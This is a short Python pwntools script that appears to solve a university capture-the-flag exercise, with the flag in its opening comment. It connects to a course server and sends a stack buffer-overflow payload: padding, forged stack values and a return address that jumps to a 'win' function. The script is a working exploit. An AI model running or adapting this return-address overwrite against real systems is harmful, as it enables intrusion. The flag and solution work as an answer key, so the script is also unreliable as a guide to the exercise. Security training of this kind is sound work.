# SSof{Overflow_of_r37urn_address}
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22155

### run a remote process
s = remote(SERVER, PORT, timeout=9999)
# s = process('./check', shell=True)


### interact with it
# 0x0804a000	0x0804a000	0xffffd008	
stack_base = b"\x08\xa0\x04\x08"*2+b"\x08\xd0\xff\xff"
# jump to ptr 0x080487d9
win = b'\xd9\x87\x04\x08'
msg = b'A'*(32) + stack_base + win
print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

# s.recvall()
s.interactive()

